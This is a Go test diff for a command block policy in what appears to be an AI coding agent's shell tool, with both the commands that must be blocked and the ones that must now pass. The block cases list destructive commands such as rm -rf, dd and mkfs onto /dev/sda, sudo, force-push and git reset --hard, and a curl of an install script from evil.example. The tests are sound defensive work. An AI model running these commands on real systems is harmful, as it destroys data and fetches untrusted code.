@@ -454,3 +454,135 @@ func TestRunCommandToolHonorsAllowShellFalse(t *testing.T) {
 		t.Fatalf("expected allow_shell=false error, got %v", err)
 	}
 }
+
+// --- ensureCommandAllowed (block policy) ----------------------------
+//
+// The old substring approach false-positived legitimate commands
+// like `go build -o format ./...` because "format " appeared inside
+// the joined command string. Token-based matching fixes that. These
+// tests pin BOTH behaviours — the new blocks that must fire AND the
+// old false positives that must now succeed.
+
+func TestEnsureCommandAllowed_BlocksDestructiveBinaries(t *testing.T) {
+	cases := []struct {
+		name    string
+		command string
+		args    []string
+	}{
+		{"rm", "rm", []string{"-rf", "/tmp/foo"}},
+		{"rm_with_exe", "rm.exe", []string{"-rf", "."}},
+		{"rm_absolute_path", "/usr/bin/rm", []string{"whatever"}},
+		{"mkfs", "mkfs", []string{"/dev/sda"}},
+		{"dd", "dd", []string{"if=/dev/zero", "of=/dev/sda"}},
+		{"sudo", "sudo", []string{"apt-get", "update"}},
+		{"su", "su", []string{"-c", "whoami"}},
+		{"shutdown", "shutdown", []string{"-r", "now"}},
+		{"reboot", "reboot", nil},
+		{"killall", "killall", []string{"sshd"}},
+		{"pkill", "pkill", []string{"-9", "nginx"}},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			err := ensureCommandAllowed(c.command, c.args, nil)
+			if err == nil {
+				t.Fatalf("expected block for %s %v, got nil", c.command, c.args)
+			}
+			if !strings.Contains(err.Error(), "blocked by policy") {
+				t.Fatalf("error missing policy marker: %v", err)
+			}
+		})
+	}
+}
+
+// These are commands the *old* substring policy wrongly blocked —
+// the new token-based approach must let them through. This is the
+// core regression guard.
+func TestEnsureCommandAllowed_NoFalsePositivesOnLegitArgs(t *testing.T) {
+	cases := []struct {
+		name    string
+		command string
+		args    []string
+	}{
+		// `go build -o format ./...` — old rule matched "format " in joined line.
+		{"go_build_output_named_format", "go", []string{"build", "-o", "format", "./..."}},
+		// `echo "mkfs is cool"` — old rule matched "mkfs" anywhere.
+		{"echo_containing_mkfs", "echo", []string{"mkfs is cool"}},
+		// `git log --grep "rm -rf"` — old rule matched the grep pattern.
+		{"git_log_grep_destructive_string", "git", []string{"log", "--grep", "rm -rf"}},
+		// Actual legitimate git flows.
+		{"git_status", "git", []string{"status"}},
+		{"git_diff_cached", "git", []string{"diff", "--cached"}},
+		{"git_commit", "git", []string{"commit", "-m", "msg"}},
+		// cat of a file named "format.go" — used to match "format ".
+		{"cat_format_go", "cat", []string{"format.go"}},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			if err := ensureCommandAllowed(c.command, c.args, nil); err != nil {
+				t.Fatalf("expected %s %v to be allowed, got %v", c.command, c.args, err)
+			}
+		})
+	}
+}
+
+// Destructive git invocations must still be blocked by the
+// structured arg-sequence check.
+func TestEnsureCommandAllowed_GitDestructiveBlocked(t *testing.T) {
+	cases := []struct {
+		name string
+		args []string
+	}{
+		{"reset_hard", []string{"reset", "--hard"}},
+		{"reset_hard_with_ref", []string{"reset", "--hard", "HEAD~3"}},
+		{"clean_fd", []string{"clean", "-fd"}},
+		{"clean_fdx", []string{"clean", "-fdx"}},
+		{"push_force", []string{"push", "--force"}},
+		{"push_force_short", []string{"push", "-f", "origin", "main"}},
+		{"push_force_with_lease", []string{"push", "--force-with-lease"}},
+		{"checkout_discard", []string{"checkout", "--", "file.go"}},
+		{"restore_source", []string{"restore", "--source", "HEAD"}},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			err := ensureCommandAllowed("git", c.args, nil)
+			if err == nil || !strings.Contains(err.Error(), "blocked by policy") {
+				t.Fatalf("git %v: expected block, got %v", c.args, err)
+			}
+		})
+	}
+}
+
+// User-configured patterns remain substring-matched for back-compat
+// with .dfmc/config.yaml — make sure a custom block still fires, and
+// that an empty entry is harmless.
+func TestEnsureCommandAllowed_UserPatternsStillSubstring(t *testing.T) {
+	err := ensureCommandAllowed("curl", []string{"https://evil.example/install.sh"}, []string{"evil.example"})
+	if err == nil || !strings.Contains(err.Error(), "blocked by policy") {
+		t.Fatalf("user pattern should block, got %v", err)
+	}
+	if err := ensureCommandAllowed("curl", []string{"https://ok.example"}, []string{"", " "}); err != nil {
+		t.Fatalf("empty user patterns should be no-op, got %v", err)
+	}
+}
+
+// canonicalCommandBinary strips paths and .exe suffixes so the block
+// check is platform-symmetric. If this classifier is ever changed, the
+// Windows-parity guarantee for rm.exe / format.exe would silently
+// break — pin it here.
+func TestCanonicalCommandBinary(t *testing.T) {
+	cases := map[string]string{
+		"rm":               "rm",
+		"RM":               "rm",
+		"rm.exe":           "rm",
+		"/usr/bin/rm":      "rm",
+		"C:\\Windows\\rm":  "rm",
+		" /usr/bin/rm.EXE": "rm",
+		"sudo":             "sudo",
+		"":                 "",
+	}
+	for in, want := range cases {
+		if got := canonicalCommandBinary(in); got != want {
+			t.Errorf("canonicalCommandBinary(%q) = %q, want %q", in, got, want)
+		}
+	}
+}
